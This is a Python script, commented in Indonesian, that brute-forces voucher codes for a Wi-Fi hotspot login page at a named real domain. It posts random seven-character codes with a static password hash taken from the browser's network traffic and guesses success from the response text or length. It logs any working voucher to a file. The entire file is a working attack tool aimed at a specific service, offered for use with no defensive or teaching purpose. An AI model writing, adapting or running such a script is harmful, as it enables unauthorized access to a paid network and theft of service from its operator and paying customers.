import requests
import string
import random
import time

# --- KONFIGURASI ---
URL_LOGIN = "https://carisa.net/login"
MAX_ATTEMPTS = 1000 
CHARACTERS = string.ascii_uppercase + string.digits

# Password konstan yang Anda temukan dari Network Tab
STATIC_PASSWORD = "e16c829324597ab36453eecff57215c6"

def check_voucher(voucher_code):
    """
    Mengirim request POST dengan password statis.
    """
    try:
        payload = {
            "username": voucher_code,
            "password": STATIC_PASSWORD, # Gunakan password statis ini
            "dst": "http://www.msftconnecttest.com/redirect",
            "popup": "true"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://carisa.net/login"
        }
        
        response = requests.post(URL_LOGIN, data=payload, headers=headers, timeout=5)
        
        # Logika Deteksi Sukses/Error
        # Kita asumsikan halaman error mengandung pesan "tidak sesuai"
        if "tidak sesuai" in response.text.lower():
            return False
            
        # Jika tidak ada error, kita anggap sukses (atau cek konten spesifik)
        # Halaman sukses biasanya redirect atau menampilkan menu logout/balance
        if ("success" in response.text.lower() or 
            "balance" in response.text.lower() or 
            "logout" in response.text.lower()):
            return True
            
        # Fallback: Jika halaman sukses lebih pendek daripada halaman error
        if len(response.text) < 2000: # Anggap halaman sukses lebih kecil
             return True
             
        return False

    except Exception as e:
        print(f"Error koneksi pada {voucher_code}: {e}")
        return False

def main():
    print("Memulai Brute Force Voucher dengan Password Statisch...")
    print(f"Password yang digunakan: {STATIC_PASSWORD}")
    
    attempts = 0
    
    for _ in range(MAX_ATTEMPTS):
        voucher = ''.join(random.choice(CHARACTERS) for _ in range(7))
        attempts += 1
        
        print(f"[{attempts}] Mencoba: {voucher} ...")
        
        if check_voucher(voucher):
            print(f"\n{'='*20}")
            print(f"*** VOUCHER DITEMUKAN: {voucher} ***")
            print(f"Password Hash: {STATIC_PASSWORD}")
            print(f"{'='*20}")
            
            with open("found_vouchers.txt", "a") as f:
                f.write(f"{voucher}:{STATIC_PASSWORD}\n")
                
            break
        else:
            time.sleep(0.2)
            
    print("Selesai.")

if __name__ == "__main__":
    main()